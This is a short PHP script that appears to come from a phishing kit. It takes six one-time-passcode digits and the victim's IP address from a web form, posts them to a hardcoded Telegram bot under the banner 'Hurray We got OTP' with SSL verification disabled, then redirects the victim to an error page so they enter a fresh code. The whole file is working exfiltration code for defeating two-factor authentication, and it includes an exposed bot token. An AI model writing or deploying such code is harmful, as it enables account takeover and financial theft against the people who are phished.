<?php
  $otp1 = $_POST['otp1'];
  $otp2 = $_POST['otp2'];
  $otp3 = $_POST['otp3'];
  $otp4 = $_POST['otp4'];
  $otp5 = $_POST['otp5'];
  $otp6 = $_POST['otp6'];
  $ip = $_POST['ip'];
  $chatid = '6677697197';
  $token = '6809143098:AAGGgVsITgVQS-90tmrEtn2UV9OL1A4BQ1E';
  $msg = " ╔═════════════════════╗ \n ❰⚠️❱ <b>Hurray We got OTP</b> ❰⚠️❱  \n \n ◉ OTP : <b> $otp1 $otp2 $otp3 $otp4 $otp5 $otp6</b> \n \n ◉ IP : <b> $ip </b> \n \n ╚═════════════════════╝";
  $data = ['text' => $msg,'chat_id' => $chatid,];
  $data = array(
    'text' => $msg,
    'chat_id' => $chatid,
    'parse_mode' => 'HTML'
  );

  $ch = curl_init();
  curl_setOPT($ch, CURLOPT_URL, "https://api.telegram.org/bot{$token}/sendMessage");
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/x-www-form-urlencoded"]);
  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
  curl_close($ch);
  header("Location: ../verification.php?error=true");
  
?>